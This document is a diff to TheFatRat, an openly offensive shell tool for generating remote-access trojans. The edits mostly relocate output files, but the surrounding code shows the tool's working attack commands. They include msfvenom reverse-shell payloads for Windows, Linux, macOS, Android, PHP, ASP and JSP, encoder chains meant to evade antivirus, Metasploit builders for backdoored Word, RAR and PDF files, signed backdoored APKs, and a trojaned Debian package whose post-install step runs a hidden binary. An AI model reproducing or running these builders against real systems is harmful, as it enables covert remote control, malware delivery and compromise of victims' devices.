@@ -79,6 +79,11 @@ echo ""
 echo -e "$orange""Restart fatrat"
 exit 1
 fi
+output="$HOME/Fatrat_Generated"
+if [[ ! -d "$output" ]]
+then
+mkdir "$output" >/dev/null 2>&1
+fi
 codename=Whistle
 OS=`uname` #
 distro=$dist0
@@ -90,13 +95,13 @@ dave='python tools/trusted_2_6.py'
 B='tools/prog.cs'
 C='tools/dad.c'
 apache='tools/apache.c'
-paycom='output/payload.c'
-pdfcom='output/pdf.c'
-bcom='output/Program.cs'
-pdfcom='output/pdf.c'
+paycom='$output/payload.c'
+pdfcom='$output/pdf.c'
+bcom='$output/Program.cs'
+pdfcom='$output/pdf.c'
 pstager='tools/power.py'
-apachecom='output/apache_com.c'
-out='output/ip.txt'
+apachecom='$output/apache_com.c'
+out='$output/ip.txt'
 pump='tools/pump.py'
 dllcustom='temp/dll_cus.c'
 reverse1='temp/reverse1.c'
@@ -1043,15 +1048,16 @@ clear
 if [ -f "$file" ]
 then
 #config file exists , then load tools paths to specific variables
-msfconsole=`sed -n 14p $file`
-msfvenom=`sed -n 15p $file`
-backdoor=`sed -n 16p $file`
-searchsploit=`sed -n 17p $file`
-aapt=`sed -n 11p $file`
-apktool=`sed -n 12p $file`
+msfconsole=`sed -n 13p $file`
+msfvenom=`sed -n 14p $file`
+backdoor=`sed -n 15p $file`
+searchsploit=`sed -n 16p $file`
+aapt=`sed -n 10p $file`
+apktool=`sed -n 11p $file`
 keytool=`sed -n 7p $file`
 sign=`sed -n 5p $file`
-dx=`sed -n 10p $file`
+dx=`sed -n 9p $file`
+baksmali=`sed -n 12p $file`
 else
 #config file does not exist
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
@@ -1321,16 +1327,16 @@ else
    exit 1
 fi
 sleep 0.5
-# check dex2jar if exists
-      which d2j-dex2jar > /dev/null 2>&1
+# check baksmali if exists
+      which baksmali > /dev/null 2>&1
       if [ -d $find ]; then
-      echo -e $okegreen [✔]::[Dex2jar]: Installation found!;
+      echo -e $okegreen [✔]::[Baksmali]: Installation found!;
 
 else
 
-   echo -e $red [x]::[warning]:this script require Dex2jar to work ;
+   echo -e $red [x]::[warning]:this script require Baksmali to work ;
    echo ""
-   echo -e $red [!]::Run setup.sh to install dex2jar ;
+   echo -e $red [!]::Run setup.sh to install baksmali ;
    echo ""
    sleep 0.5
    exit 1
@@ -1535,7 +1541,7 @@ function pstagef() {
 # Powerstager file will be stored in main fatrat directory
 # Checking if file was created
 
-fout="$path/output"
+fout="$output"
 if [ -f $fstager ]
 then
 echo ""
@@ -1557,19 +1563,19 @@ fi
 # In case there is already a file in output dir with same name , then rename it
 
 ren=`shuf -i 1-1000 -n 1`
-chk="$path/output/$fira.exe"
+chk="$output/$fira.exe"
 if [ -f "$chk" ]; then
-mv $chk $path/output/old_$ren.exe >> $logfud 2>&1
+mv $chk $output/old_$ren.exe >> $logfud 2>&1
 echo -e $yellow " "
 echo " [!] FatRat Detected that you already had a previous created FUD"
-echo "file in ($path/output/) with the name $fira.exe ."
+echo "file in ($output/) with the name $fira.exe ."
 echo -e $okegreen ""
 echo " [✔] FatRat have renamed your old FUD Rat to old_$ren.exe"
 echo ""
 echo -e $cyan "[*] You can find your file in :
-$path/output/old_$ren.exe"
+$output/old_$ren.exe"
 else
-mv $fstager $path/output/$fira.exe >> $logfud 2>&1
+mv $fstager $output/$fira.exe >> $logfud 2>&1
 echo ""
 echo -e $cyan "[*] You can find your file in :
 $chk"
@@ -2030,10 +2036,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-      	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
+      	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > $output/$fira.elf
 
 # Checking if file was created
-        fileout="output/$fira.elf"
+        fileout="$output/$fira.elf"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2044,7 +2050,7 @@ echo ""
         cmsfvenom
         else
         echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.elf"
+        echo "Your rat file was created and it is stored in : $output/$fira.elf"
         echo ""
         echo -ne "Press [ENTER] key to return to menu ."
         read cont
@@ -2093,10 +2099,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
+	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o $output/$fira.exe
 
 # Checking if file was created
-        fileout="output/$fira.exe"
+        fileout="$output/$fira.exe"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2107,7 +2113,7 @@ echo ""
         cmsfvenom
         else
         echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.exe"
+        echo "Your rat file was created and it is stored in : $output/$fira.exe"
         echo ""
         echo -ne "Press [ENTER] key to return to menu ."
         read cont
@@ -2154,9 +2160,9 @@ echo ""
 	echo -e $okegreen ""
         echo "[*] Creating RAT payload with msfvenom"
         sleep 1
-	$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/backdoored/$fira.apk >>$log /dev/null 2>&1
+	$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $output/$fira.apk >>$log /dev/null 2>&1
 #check file
-        outapk=$path/backdoored/$fira.apk
+        outapk=$output/$fira.apk
         if [ ! -f "$outapk" ]
         then
         echo -e $red ""
@@ -2188,7 +2194,7 @@ echo ""
         echo "[✔] Done!"
         echo "[*] Signing your payload APK"
         sleep 1
-        $sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/backdoored/$fira.apk androiddebugkey >>$log 2>&1
+        $sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $output/$fira.apk androiddebugkey >>$log 2>&1
         echo "[✔] Done!"
 
         # After signing the apk file , android certificate is not needed anymore
@@ -2231,7 +2237,7 @@ echo ""
         echo "Configuration file saved to $list/$fname.rc"
         fi
         # Checking if file was created
-        fileout="$path/backdoored/$fira.apk"
+        fileout="$output/$fira.apk"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2251,7 +2257,7 @@ echo ""
         ;;
         n|N|no|No|NO)
         # Checking if file was created
-        fileout="$path/backdoored/$fira.apk"
+        fileout="$output/$fira.apk"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2317,10 +2323,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-      	$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
+      	$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > $output/$fira.macho
 
 # Checking if file was created
-          fileout="$path/output/$fira.macho"
+          fileout="$output/$fira.macho"
           if [ ! -f "$fileout" ]
           then
           echo -e $red ""
@@ -2375,9 +2381,9 @@ echo ""
 	spinlong2
 	echo ""
 	echo ""
-        $msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
+        $msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > $output/$fira.php
 # Checking if file was created
-        fileout="$path/output/$fira.php"
+        fileout="$output/$fira.php"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2435,10 +2441,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-        $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
+        $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > $output/$fira.asp
 
 # Checking if file was created
-        fileout="$path/output/$fira.asp"
+        fileout="$output/$fira.asp"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2496,10 +2502,10 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-    	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
+    	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.jsp
 
 # Checking if file was created
-        fileout="$path/output/$fira.jsp"
+        fileout="$output/$fira.jsp"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2557,9 +2563,9 @@ echo ""
 	spinlong2
 	echo ""
 	echo ""
-      	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
+      	$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > $output/$fira.war
 # Checking if file was created
-        fileout="$path/output/$fira.war"
+        fileout="$output/$fira.war"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2617,9 +2623,9 @@ echo ""
 	spinlong
 	echo ""
 	echo ""
-        $msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
+        $msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.py
 # Checking if file was created
-fileout="$path/output/$fira.py"
+fileout="$output/$fira.py"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2676,10 +2682,10 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-      	$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
+      	$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.sh
 
 # Checking if file was created
-        fileout="$path/output/$fira.sh"
+        fileout="$output/$fira.sh"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2736,9 +2742,9 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-    	$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
+    	$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > $output/$fira.pl
 # Checking if file was created
-        fileout="$path/output/$fira.pl"
+        fileout="$output/$fira.pl"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2800,10 +2806,10 @@ fileout="$path/output/$fira.py"
             rm -rf ~/.msf4/local/* >/dev/null 2>&1
             xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set PAYLOAD $payload ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
             echo ""
-            mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
+            mv ~/.msf4/local/$fira.doc $output/$fira.doc >/dev/null 2>&1
             echo -e $okegreen""
 # Checking if file was created
-            fileout="$path/output/$fira.doc"
+            fileout="$output/$fira.doc"
             if [ ! -f "$fileout" ]
             then
             echo -e $red ""
@@ -2871,10 +2877,10 @@ fileout="$path/output/$fira.py"
               rm -rf ~/.msf4/local/* >/dev/null 2>&1
               xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payload; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'"
               echo ""
-              mv ~/.msf4/local/$fira $path/output/$fira
+              mv ~/.msf4/local/$fira $output/$fira
 
 # Checking if file was created
-            fileout="$path/output/$fira"
+            fileout="$output/$fira"
             if [ ! -f "$fileout" ]
             then
             echo -e $red ""
@@ -2934,10 +2940,10 @@ fileout="$path/output/$fira.py"
 	spinlong
 	echo ""
 	echo ""
-	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f dll -o output/$fira.dll
+	$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f dll -o $output/$fira.dll
 
 # Checking if file was created
-        fileout="output/$fira.dll"
+        fileout="$output/$fira.dll"
         if [ ! -f "$fileout" ]
         then
         echo -e $red ""
@@ -2948,7 +2954,7 @@ fileout="$path/output/$fira.py"
         cmsfvenom
         else
         echo -e $okegreen ""
-        echo "Your rat file was created and it is stored in : $path/output/$fira.dll"
+        echo "Your rat file was created and it is stored in : $output/$fira.dll"
         echo ""
         echo -ne "Press [ENTER] key to return to menu ."
         read cont
@@ -3566,10 +3572,10 @@ case $choice in
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
       	    	echo -e $okegreen""
-                fidoc=$path/output/$fira.doc
+                fidoc=$output/$fira.doc
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.doc "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3656,13 +3662,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
 
-         	fidoc=$path/output/$fira.docm
+         	fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3706,13 +3712,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
 					echo ""
 
-                fidoc=$path/output/$fira.docm
+                fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3803,13 +3809,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+    			mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
 
-                fidoc=$path/output/$fira.docm
+                fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3853,12 +3859,12 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.docm
+         	fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3949,10 +3955,10 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.odt
+         	fidoc=$output/$fira.odt
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.odt "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -4042,10 +4048,10 @@ fi
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.odt
+         	fidoc=$output/$fira.odt
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.odt "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -4139,7 +4145,7 @@ echo ""
 sleep 1
 #select tool to build apk rat
 echo -e $orange "+------------------------------+"
-echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.2$orange |"
+echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.4a$orange |"
 echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange  |"
 echo -e $orange "+------------------------------+"
 echo ""
@@ -4154,8 +4160,8 @@ gboor2
 # remove any existent apkconfig file and create a new one with the data for backdoor_apk to read
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig
-echo "app.apk" > $apkconfig
-echo "Rat.apk" >> $apkconfig
+echo "$path/temp/app.apk" > $apkconfig
+echo "$path/temp/Rat.apk" >> $apkconfig
 echo $payload >> $apkconfig
 echo $yourip >> $apkconfig
 echo $yourport >> $apkconfig
@@ -4249,18 +4255,18 @@ fi
 #looking if already exists a previous backdoor apk created and renaming it
 
 ren=`shuf -i 1-1000 -n 1`
-back=$path/backdoored/app_backdoored.apk
+back=$output/app_backdoored.apk
 if [ -f "$back" ]
 then
-mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk >>$log 2>&1
+mv $output/app_backdoored.apk $output/app_backdoored_$ren.apk >>$log 2>&1
 echo -e $yellow ""
 echo "[!] FatRat Detected that you already had a previous created backdoor
-file in ($path/backdoored/) with the name app_backdoored.apk ."
+file in ($output/) with the name app_backdoored.apk ."
 echo -e $okegreen ""
 echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
 
 # Moving apk backdoor to final destination
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+mv $path/temp/app_backdoored.apk $output/app_backdoored.apk >>$log 2>&1
 
 # Removing temp files
 rm -rf temp/* > /dev/null 2>&1
@@ -4268,11 +4274,11 @@ else
 
 
 # Moving apk backdoor to final destination
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+mv $path/temp/app_backdoored.apk $output/app_backdoored.apk >>$log 2>&1
 rm -rf temp/* > /dev/null 2>&1
 fi
 
-varopt="$path/backdoored/app_backdoored.apk"
+varopt="$output/app_backdoored.apk"
 if [ ! -f $varopt ]; then
 echo -e $red ""
 echo "[x] There was an error copying your Rat app to final destination .
@@ -4285,7 +4291,7 @@ fi
 
 echo -e $green ""
 echo "Your payload has been successfully & signed and it is located at :
- $path/backdoored/app_backdoored.apk"
+ $output/app_backdoored.apk"
 sleep 2
 echo -e $okegreen ""
 echo "[*] Removing temporary files"
@@ -4391,12 +4397,12 @@ spinlong
 					cat powershell_attack.txt
 					sleep 2
 					rm unicorn.rc
-					mv powershell_attack.txt output/$fira.bat
+					mv powershell_attack.txt $output/$fira.bat
 					echo ""
 					echo -e $okegreen""
-					if [[ -f "$path/output/$fira.bat" ]]
+					if [[ -f "$output/$fira.bat" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.bat"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.bat"
 					else
 					echo -e "$red""There was an error creating the baackdoor"
 					fi
@@ -4461,12 +4467,12 @@ spinlong
 					echo;spinlong;echo
 					sleep 1
 					echo
-					mcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
+					mcs $bcom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt
 					echo ""
-					if [[ -f "$path/output/$fira.exe" ]]
+					if [[ -f "$output/$fira.exe" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.exe"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -4528,14 +4534,14 @@ spinlong
 
 					sed s/SERVER/$s0/g $apache > $apachecom
 					echo
-					$COMPILER -Wall -mwindows $apachecom -o "output/$fira.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $apachecom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc  $apachecom $out
 					mv powershell_attack.txt $apache2
 					sleep 2
 					echo ""
-					if [[ -f "$path/output/$fira.exe" ]]
+					if [[ -f "$output/$fira.exe" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.exe"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -4595,13 +4601,13 @@ spinlong
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
 					echo
-					$COMPILER -Wall -mwindows $paycom -o "output/$fira.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $paycom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt $paycom
 					sleep 2
 					echo ""
-					if [[ -f "$path/output/$fira.exe" ]]
+					if [[ -f "$output/$fira.exe" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.exe"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -4668,17 +4674,17 @@ pldwin
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
 					echo
-					$COMPILER -Wall -mwindows $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $pdfcom -o "$output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
-					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
+					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
-					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
+					mv ~/.msf4/local/$fira.pdf $output/$fira.pdf
 					rm unicorn.rc > /dev/null 2>&1
 					rm  powershell_attack.txt > /dev/null 2>&1
-					if [[ -f "$path/output/$fira.pdf" ]]
+					if [[ -f "$output/$fira.pdf" ]]
 					then
-					echo -e "$okegreen""Backdoor PDF Saved To : $path/output/$fira.pdf"
+					echo -e "$okegreen""Backdoor PDF Saved To : $output/$fira.pdf"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -4902,13 +4908,13 @@ fi
         echo ' }' >> $reverse1
         echo ' return 0;' >> $reverse1
         echo '}' >> $reverse1
-        $COMPILER $reverse1 -o output/$fira.exe -lws2_32 -mwindows
+        $COMPILER $reverse1 -o $output/$fira.exe -lws2_32 -mwindows
 	      echo
         echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
         rm $reverse1
-       if [[ -f "$path/output/$fira.exe" ]]
+       if [[ -f "$output/$fira.exe" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.exe"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -5033,13 +5039,13 @@ fi
       echo '    function();'>>$stag
       echo '    return 0;'>>$stag
       echo '}' >> $stag
-      $COMPILER $stag -o output/$fira.exe -lws2_32
+      $COMPILER $stag -o $output/$fira.exe -lws2_32
       echo
       echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
       rm $stag
-if [[ -f "$path/output/$fira.exe" ]]
+if [[ -f "$output/$fira.exe" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.exe"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -5166,14 +5172,14 @@ fi
 	echo '    function();'>> $dllcustom
 	echo '    return 0;'>> $dllcustom
 	echo '}' >> $dllcustom
-      $COMPILER $dllcustom -o output/$fira.dll -lws2_32 -shared
+      $COMPILER $dllcustom -o $output/$fira.dll -lws2_32 -shared
       echo
-      strip output/$fira.dll
+      strip $output/$fira.dll
             rm $dllcustom
       echo -e $yellow " [+]"$okegreen" Compiling C to dll done , chek in output folder  ";tput sgr0
-     if [[ -f "$path/output/$fira.dll" ]]
+     if [[ -f "$output/$fira.dll" ]]
 					then
-					echo -e "$okegreen""Backdoor Saved To : $path/output/$fira.dll"
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.dll"
 					else
 					echo -e "$red""There was an error creating the backdoor"
 					fi
@@ -5261,7 +5267,7 @@ echo -e "   [desc] - Embed a Trojan Into Deb PKG + Run Post Install       "
   echo " sudo chmod 2755 /usr/lib/libssll/bash && /usr/lib/libssll/bash & " >> tools/trodebi_temp/work/DEBIAN/postinst
   chmod 755 tools/trodebi_temp/work/DEBIAN/postinst
   dpkg-deb --build tools/trodebi_temp/work
-  mv tools/trodebi_temp/work.deb output/$fira.deb
+  mv tools/trodebi_temp/work.deb $output/$fira.deb
   rm -rf tools/trodebi_temp/work/* >> /dev/null 2>&1
   rm -rf tools/trodebi_temp/evil/* >> /dev/null 2>&1
   rm -rf tools/trodebi_temp/original/* >> /dev/null 2>&1
@@ -5724,8 +5730,8 @@ menu () {
     				spinlong2
     				echo ""
     				echo -e $okegreen""
-    				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-  backout="$path/backdoored/output/$fira.exe"
+    				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o $output/$fira.exe
+  backout="$output/$fira.exe"
    if [ ! -f "$backout" ]
   then
   echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
@@ -5738,7 +5744,7 @@ menu () {
   else
   echo ""
   echo -e $cyan "Your Rat was saved To :"
-  echo -e $cyan "$path/backdoored/output/$fira.exe"
+  echo -e $cyan "$output/$fira.exe"
   echo ""
   bkflst
     				read bebeku
@@ -5825,8 +5831,8 @@ menu () {
         rm $path/autorun/* >/dev/null 2>&1
         sleep 2
         echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/output/"
-        rm $path/output/* >/dev/null 2>&1
+        echo -e $red"  [*] $cyan Cleaning $output/"
+        rm $output/* >/dev/null 2>&1
         sleep 2
         echo ""
         echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
@@ -5836,11 +5842,7 @@ menu () {
         echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
         rm *.exe *.apk  >/dev/null 2>&1
         sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
-        rm $path/backdoored/output/* >/dev/null 2>&1
-        echo ""
-        echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
+                echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
         read anjeng
         menu
 
@@ -5973,8 +5975,8 @@ echo
   				spinlong2
   				echo ""
   				echo -e $okegreen""
-  				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-backout="$path/backdoored/output/$fira.exe"
+  				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o $output/$fira.exe
+backout="$output/$fira.exe"
  if [ ! -f "$backout" ]
 then
 echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
@@ -5987,7 +5989,7 @@ menu
 else
 echo ""
 echo -e $cyan "Your Rat was saved To :"
-echo -e $cyan "$path/backdoored/output/$fira.exe"
+echo -e $cyan "$output/$fira.exe"
 echo ""
 bkflst
   				read bebeku
@@ -6074,8 +6076,8 @@ elif test $fatrat == '11'
       rm $path/autorun/* >/dev/null 2>&1
       sleep 2
       echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/output/"
-      rm $path/output/* >/dev/null 2>&1
+      echo -e $red"  [*] $cyan Cleaning $output/"
+      rm $output/* >/dev/null 2>&1
       sleep 2
       echo ""
       echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
@@ -6085,9 +6087,6 @@ elif test $fatrat == '11'
       echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
       rm *.exe *.apk  >/dev/null 2>&1
       sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
-      rm $path/backdoored/output/* >/dev/null 2>&1
       echo ""
